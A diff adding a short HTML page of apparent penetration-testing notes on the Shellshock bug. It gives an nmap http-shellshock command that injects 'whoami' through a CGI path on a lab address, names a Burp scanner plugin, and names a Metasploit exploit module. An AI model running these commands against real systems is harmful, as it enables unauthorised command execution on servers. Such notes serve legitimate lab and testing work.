@@ -1,0 +1,21 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Automatic</title>
+</head><body><b><span style="font-size: 12pt">Detection</span><br/>
+</b><tt><br/>
+</tt><b>nmap<br/>
+</b><tt><br/>
+</tt><tt>nmap 10.11.1.71 -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi,cmd=whoami</tt><br/>
+<br/>
+<b>Burp<br/>
+</b><br/>
+Burp Suite Active Scan++ plugin Intrusive vulns scanner<br/>
+<br/>
+<span style="font-size: 14pt"><b><br/>
+</b></span><b><span style="font-size: 12pt">Exploitation</span></b><span style="font-size: 14pt"><br/>
+</span><b><br/>
+</b><b>Metasploit</b><br/>
+<tt><br/>
+use exploit/multi/http/apache_mod_cgi_bash_env_exec<br/>
+</tt></body></html>
